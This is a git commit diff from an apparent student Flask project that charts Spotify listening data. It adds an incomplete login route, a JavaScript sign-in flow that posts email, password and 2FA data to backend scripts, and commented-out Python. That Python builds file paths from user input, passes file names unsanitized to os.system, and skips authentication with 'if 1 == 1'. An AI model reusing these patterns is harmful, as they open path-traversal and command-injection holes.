c3f815c3a02311788becb0af32bad6eae2183315
Faizan Zafar <faizan.zafar01@student.csulb.edu>
2023-04-15 17:39:33 -0700

    major rework

---
+++ flaskApp.py
@@ -0,0 +1,72 @@
+from flask import Flask , redirect, url_for, render_template, request,Blueprint
+
+
+import random, string, os
+
+from _thread import start_new_thread
+
+
+
+main = Blueprint('main', __name__)
+
+
+@main.route('/profile')
+def profile():
+    return 'Profile'
+
+@main.route('/login', methods=['GET', 'POST'])
+def login():
+    # Here we use a class of some kind to represent and validate our
+    # client-side form data. For example, WTForms is a library that will
+    # handle this for us, and we use a custom LoginForm to validate.
+    form = LoginForm()
+    if form.validate_on_submit():
+        # Login and validate the user.
+        # user should be an instance of your `User` class
+        login_user(user)
+
+        flask.flash('Logged in successfully.')
+
+        next = flask.request.args.get('next')
+        # is_safe_url should check if the url is safe for redirects.
+        # See http://flask.pocoo.org/snippets/62/ for an example.
+        if not is_safe_url(next):
+            return flask.abort(400)
+
+        return flask.redirect(next or flask.url_for('index'))
+    return flask.render_template('login.html', form=form)
+
+@main.route("/")
+def home():
+    return render_template("index.html")
+
+# @main.route('/mydata', methods = ['POST'])
+# def view_data():
+#      if request.method == 'POST':
+#         user =  request.form["email"]
+#         pswd = request.form["password"]
+#         barChartData = ""
+#         pieChartData = ""
+#         #temp if statement that needs to be replaced with user validation
+#         if 1 == 1:
+#             #files containing the json formats needed for HighCharts
+#             with open('./'+user+'/topTags.json', 'r') as file:
+#                 pieChartData = json.loads(file.read())
+#             #with open('./'+user+'/'+pswd, 'r') as file:
+#             with open('./'+user+'/topten.json', 'r') as file:
+#                 barChartData = json.loads(file.read())
+#             return render_template("chart.html", topTenData=json.dumps(barChartData), pieData=json.dumps(pieChartData))
+#         else:
+#             return redirect(url_for(home))
+
+
+# #creates a string of the filenames from upload_files and uses it as an argument for c++ program
+# def processFiles(userhash):
+#     fileList = []
+#     for file in os.listdir('./'+userhash+'/'):
+#         if file.endswith(".json"):
+#             fileList.append('./'+userhash+'/' + file)
+#     arg = ' '.join(fileList)
+#     #start c++ project to process the initall data
+#     os.system("./Spotify " + arg)
+#     processData(userhash)
---
+++ template/app.js
@@ -0,0 +1,67 @@
+var nextBtn = document.querySelector(".sign-in-next-btn-submit");
+var signInBtn = document.querySelector(".sign-in-btn-submit")
+
+var verifyDiv = document.querySelector(".verification-form")
+
+var passwordDiv = document.querySelector(".password-sign-in-form");
+var emailDiv = document.querySelector(".email-sign-in-form");
+var loadingDiv = document.querySelector(".loading-screen");
+
+//call python function
+
+function postData(email, password) {
+  $.ajax({
+      type: "POST",
+      url: "/runmain.py",
+      data: { param: email,password },
+      success: callbackFunc
+  });
+}
+function callortext(email, password, isCall) {
+  if (isCall == 1){
+    $.ajax({
+      type: "POST",
+      url: "/write2fa.py",
+      data: { param: email,password },
+      success: callbackFunc
+  });
+  }
+
+}
+
+
+function callbackFunc(response) {
+  // do something with the response
+  console.log(response);
+}
+// postData("test")
+
+nextBtn.addEventListener("click", function(event) {
+    event.preventDefault(); 
+    passwordDiv.style.display = "block";
+    emailDiv.style.display = "none";
+});
+
+signInBtn.addEventListener("click", function(event) {
+    event.preventDefault(); 
+    verifyDiv.style.display = "block";
+    passwordDiv.style.display = "none";
+});
+
+let usernameValue = localStorage.getItem("username") || "";
+
+function returnUsername() {
+  usernameValue = document.getElementById("username").value;
+  localStorage.setItem("username", usernameValue);
+  document.getElementById("display-name").innerHTML = usernameValue;
+  return usernameValue;
+}
+
+document.getElementById("username").addEventListener("keyup", returnUsername);
+
+
+
+
+
+
+
